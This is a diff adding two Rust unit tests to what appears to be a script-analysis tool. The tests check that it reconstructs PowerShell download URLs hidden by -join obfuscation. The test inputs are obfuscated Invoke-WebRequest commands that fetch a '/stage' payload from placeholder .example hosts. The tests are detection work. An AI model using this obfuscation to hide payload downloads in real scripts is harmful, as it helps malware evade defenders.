@@ -9364,6 +9364,40 @@ mod ps_replace_join_tests {
         });
         assert!(has, "no Download after -join: {:?}", report.traits);
     }
+
+    #[test]
+    fn ps_join_double_quoted_array_resolves() {
+        let inner = r#"Invoke-WebRequest ("h","t","t","p","s",":","/","/","ps-join-dq.example","/stage" -join "")"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-join-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "no Download after double-quoted -join: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps_double_quoted_array_variable_join_resolves() {
+        let inner = r#"$p=@("https://","ps-array-var-dq.example","/stage");$u=$p -join "";Invoke-WebRequest $u"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-array-var-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "no Download after double-quoted @() array variable join: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
